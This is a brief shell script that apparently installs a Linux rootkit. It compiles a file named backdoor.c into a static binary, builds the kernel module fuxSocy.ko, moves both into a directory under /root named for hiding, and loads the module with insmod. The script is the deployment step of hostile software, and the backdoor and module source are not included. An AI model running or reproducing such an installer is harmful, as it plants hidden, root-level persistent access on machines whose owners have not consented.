gcc backdoor.c -o backdoor -static
make
DIR="/root/hide_ts_fuxSocy/"

if [ ! -d "$DIR" ]; then
    mkdir -p "$DIR"
fi

mv fuxSocy.ko $DIR
mv backdoor $DIR

insmod /root/hide_ts_fuxSocy/fuxSocy.ko

